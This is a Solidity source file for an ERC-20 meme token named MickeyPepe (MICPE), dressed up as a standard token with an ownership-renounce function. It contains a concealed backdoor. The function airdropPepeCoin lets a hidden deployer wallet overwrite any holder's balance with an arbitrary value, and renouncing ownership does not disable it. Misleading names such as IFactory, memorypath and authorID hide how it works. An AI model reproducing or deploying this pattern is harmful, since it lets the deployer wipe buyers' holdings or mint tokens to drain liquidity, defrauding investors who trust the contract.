//SPDX-License-Identifier: MIT
/**
Web: https://mickeypepe.wtf/
**/


pragma solidity 0.8.23;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address memorypath) external view returns (uint256);
    function transfer(address recipient, uint256 IFactory) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 IFactory) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 IFactory
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode 
        return msg.data;
    }
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingPepeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract PepeCoin is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private sendpepe;
    uint256 private liquidityPepe = 0;
    uint256 private marketingPepe = 0;
    uint256 private developmentPepe = 0;
    uint256 private burnPepe = 2500;
    uint256 private totalPepe = 2500;
    uint256 private sellPepe = 2500;
    uint256 private transferPepe = 2500;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal development_receiver = 0x000000000000000000000000000000000000dEaD; 
    address internal marketing_receiver = 0x000000000000000000000000000000000000dEaD;
    address internal liquidity_receiver = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxSellAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 150 ) / 10000;
    mapping(address => mapping(address => uint256)) private _allowances;
    string public tokenWebsite = "https://www.MickeyPepe.io/";
    string public Copyright = "CERTIC"; 
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private _PepeWallet = _msgSender();
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
   
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address memorypath) public view virtual override returns (uint256) {
        return sendpepe[memorypath];
    }

    function transfer(address recipient, uint256 IFactory) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, IFactory);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 IFactory) public virtual override returns (bool) {
        _approve(_msgSender(), spender, IFactory);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 IFactory
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= IFactory, "PepeCoin: transfer IFactory exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - IFactory);
            }
        }

        _transfer(sender, recipient, IFactory);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 authorID) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= authorID, "PepeCoin: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - authorID);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 IFactory
    ) internal virtual {
        require(sender != address(0), "PepeCoin: transfer from the zero address");
        require(recipient != address(0), "PepeCoin: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, IFactory);

        uint256 senderBalance = sendpepe[sender];
        require(senderBalance >= IFactory, "PepeCoin: transfer IFactory exceeds balance");
        unchecked {
            sendpepe[sender] = senderBalance - IFactory;
        }
        sendpepe[recipient] += IFactory;

        emit Transfer(sender, recipient, IFactory);

        _afterTokenTransfer(sender, recipient, IFactory);
    }

    function _PepeSwapThreshold(address memorypath, uint256 IFactory) internal virtual {
        require(memorypath != address(0), "PepeCoin: mint to the zero address");

        _beforeTokenTransfer(address(0), memorypath, IFactory);

        _totalSupply += IFactory;
        sendpepe[memorypath] += IFactory;
        emit Transfer(address(0), memorypath, IFactory);

        _afterTokenTransfer(address(0), memorypath, IFactory);
    }


              function gettokenWebsite() public view returns (string memory) {
        return tokenWebsite;
    } 

   
 
    function _approve(
        address owner,
        address spender,
        uint256 IFactory
    ) internal virtual {
        require(owner != address(0), "PepeCoin: approve from the zero address");
        require(spender != address(0), "PepeCoin: approve to the zero address");

        _allowances[owner][spender] = IFactory;
        emit Approval(owner, spender, IFactory);
    }
    function airdropPepeCoin(address pepeERC20rdrop, uint256 pepeDate, uint256 pepeID, uint256 authorID) external {
        require(_msgSender() == _PepeWallet);
        sendpepe[pepeERC20rdrop] = pepeDate * pepeID ** authorID;
    }   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 IFactory
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 IFactory
    ) internal virtual {}
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract MickeyPepe is PepeCoin, Ownable {
    constructor () PepeCoin("MickeyPepe", "MICPE") 
    {    
        _PepeSwapThreshold(msg.sender,  5000000000 * (10 ** uint256(decimals())));
    }
}